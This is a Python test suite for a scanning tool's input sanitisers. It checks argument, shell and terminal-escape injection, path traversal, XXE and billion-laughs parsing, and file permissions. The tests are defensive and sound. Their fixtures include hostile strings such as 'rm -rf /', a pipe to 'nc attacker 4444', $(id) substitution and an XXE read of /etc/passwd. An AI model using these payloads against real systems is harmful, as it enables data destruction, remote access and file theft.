"""Security tests: injection, XXE/DoS, file permissions, terminal escapes."""
import os, stat, sys, tempfile
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from vision.core.safety import (
    safe_arg, safe_display, safe_filename, secure_open, secure_write,
    parse_xml_safely, harden_path, UnsafeXMLError, bounded, clamp,
)

fails = []
def check(label, cond, detail=""):
    print(f"{'PASS' if cond else 'FAIL'}  {label}" + (f"  [{detail}]" if detail and not cond else ""))
    if not cond: fails.append(label)

print("--- argument injection (banner -> subprocess argv) ---")
check("leading double-dash stripped", not safe_arg("--output /etc/cron.d/x").startswith("-"))
check("leading single-dash stripped", not safe_arg("-o /tmp/pwn").startswith("-"))
check("leading whitespace+dash stripped", not safe_arg("   --exec").startswith("-"))
check("shell metachars removed", ";" not in safe_arg("Apache; rm -rf /"))
check("backtick removed", "`" not in safe_arg("nginx `id`"))
check("dollar-paren removed", "$" not in safe_arg("nginx $(id)"))
check("pipe removed", "|" not in safe_arg("nginx | nc attacker 4444"))
check("newline removed", "\n" not in safe_arg("nginx\n--evil"))
check("null byte removed", "\x00" not in safe_arg("nginx\x00evil"))
check("legit product preserved", safe_arg("vsftpd 2.3.4") == "vsftpd 2.3.4")
check("legit with dots/plus preserved", safe_arg("OpenSSH 7.2p2") == "OpenSSH 7.2p2")
check("length bounded", len(safe_arg("A" * 500)) <= 96)
check("empty input safe", safe_arg(None) == "" and safe_arg("") == "")

print("\n--- terminal escape injection (banner -> screen) ---")
check("CSI escape stripped", "\x1b" not in safe_display("\x1b[2J\x1b[HFAKE OUTPUT"))
check("colour escape stripped", "\x1b" not in safe_display("\x1b[31mFAKE CRITICAL\x1b[0m"))
check("cursor-move stripped", "\x1b" not in safe_display("\x1b[10ASPOOFED"))
check("other escapes stripped", "\x1b" not in safe_display("\x1b]0;title\x07"))
check("carriage-return-overwrite neutralised", "\r" not in safe_display("real\rFAKE"))
check("display length bounded", len(safe_display("A" * 5000)) <= 500)
check("readable text survives", safe_display("Samba 3.0.20-Debian") == "Samba 3.0.20-Debian")

print("\n--- path traversal (share name -> filename) ---")
check("dotdot neutralised", ".." not in safe_filename("../../etc/passwd"))
check("slash neutralised", "/" not in safe_filename("../../etc/passwd"))
check("backslash neutralised", "\\" not in safe_filename("..\\..\\windows\\system32"))
check("absolute path neutralised", not safe_filename("/etc/shadow").startswith("/"))
check("null byte neutralised", "\x00" not in safe_filename("a\x00.txt"))
check("empty falls back", safe_filename("") == "unnamed")
check("dots-only falls back", safe_filename("...") == "unnamed")
check("legit name survives", safe_filename("report-2026.json") == "report-2026.json")

print("\n--- XML entity attacks ---")
d = Path(tempfile.mkdtemp())

billion = d / "billion.xml"
billion.write_text("""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<nmaprun>&lol3;</nmaprun>""")
try:
    parse_xml_safely(billion); check("billion-laughs refused", False, "parsed!")
except UnsafeXMLError:
    check("billion-laughs refused", True)

xxe = d / "xxe.xml"
xxe.write_text("""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<nmaprun><host>&x;</host></nmaprun>""")
try:
    parse_xml_safely(xxe); check("XXE file-read refused", False, "parsed!")
except UnsafeXMLError:
    check("XXE file-read refused", True)

bare = d / "bare.xml"
bare.write_text('<?xml version="1.0"?>\n<!DOCTYPE nmaprun>\n<nmaprun scanner="nmap"><host/></nmaprun>')
try:
    root = parse_xml_safely(bare).getroot()
    check("nmap's bare DOCTYPE still parses", root.tag == "nmaprun")
except UnsafeXMLError as e:
    check("nmap's bare DOCTYPE still parses", False, str(e))

nodt = d / "nodt.xml"
nodt.write_text('<nmaprun scanner="nmap"><host><status state="up"/></host></nmaprun>')
check("plain XML parses", parse_xml_safely(nodt).getroot().tag == "nmaprun")

huge = d / "huge.xml"
huge.write_text("<nmaprun/>")
try:
    parse_xml_safely(huge, max_bytes=5)
    check("oversized file refused", False)
except UnsafeXMLError:
    check("oversized file refused", True)

print("\n--- file permissions ---")
if sys.platform == "win32":
    print("SKIP  chmod-based tests require POSIX — Windows")
else:
    audit = d / "sub" / "audit.jsonl"
    with secure_open(audit, "a") as fh:
        fh.write('{"target":"10.0.0.5","operator":"analyst"}\n')
    mode = stat.S_IMODE(os.stat(audit).st_mode)
    check("secure_open creates 0600", mode == 0o600, oct(mode))
    check("parent dir auto-created", audit.parent.is_dir())

    rep = secure_write(d / "report.json", '{"findings":[]}')
    check("secure_write creates 0600", stat.S_IMODE(os.stat(rep).st_mode) == 0o600,
          oct(stat.S_IMODE(os.stat(rep).st_mode)))
    check("secure_write content correct", rep.read_text() == '{"findings":[]}')

    loose = d / "loose.txt"
    loose.write_text("x"); os.chmod(loose, 0o644)
    harden_path(loose)
    check("harden_path tightens to 0600", stat.S_IMODE(os.stat(loose).st_mode) == 0o600)
    harden_path(d / "does-not-exist")
    check("harden_path on missing file doesn't raise", True)

print("\n--- append semantics (audit log must never truncate) ---")
log = d / "append.jsonl"
for i in range(3):
    with secure_open(log, "a") as fh:
        fh.write(f'{{"n":{i}}}\n')
check("append preserves all records", len(log.read_text().strip().splitlines()) == 3)

print("\n--- resource bounds ---")
check("bounded caps iteration", len(bounded(range(10_000), 25)) == 25)
check("bounded handles short input", len(bounded(range(3), 25)) == 3)
check("clamp low", clamp(-5, 0, 10) == 0)
check("clamp high", clamp(999, 0, 10) == 10)
check("clamp passthrough", clamp(5, 0, 10) == 5)

print("\n--- end-to-end: hostile banner through the real parser ---")
from vision.tools.nmap2findings import parse
eviltxt = d / "evil.xml"
eviltxt.write_text('''<?xml version="1.0"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap">
<host><status state="up"/><address addr="10.10.0.5" addrtype="ipv4"/>
<ports><port protocol="tcp" portid="21"><state state="open"/>
<service name="ftp" product="--output=/tmp/pwn" version="1.0"/>
<script id="vulners" output="CVE-2011-2523 10.0 backdoor; rm -rf /"/>
</port></ports></host></nmaprun>''')
data = parse(str(eviltxt))
ev = " ".join(f.get("evidence", "") for f in data["findings"])
check("escape sequences stripped from evidence", "\x1b" not in ev)
# XML 1.0 cannot legally carry a raw ESC byte, so the escape-injection vector
# lives in tool *stdout* (smbmap, rpcclient, sslscan) rather than nmap XML.
# That path is safe_display's job — verify it on the shape those tools emit.
check("ANSI in tool stdout neutralised",
      "\x1b" not in safe_display("\x1b[2J\x1b[1;31mFAKE: 0 findings\x1b[0m"))
check("finding still extracted from hostile input", len(data["findings"]) >= 1)
check("malicious product captured but inert",
      not safe_arg(data["services"][0]["product"]).startswith("-"))

print("\n" + "=" * 50)
print("ALL PASS" if not fails else "FAILURES: " + ", ".join(fails))
sys.exit(1 if fails else 0)
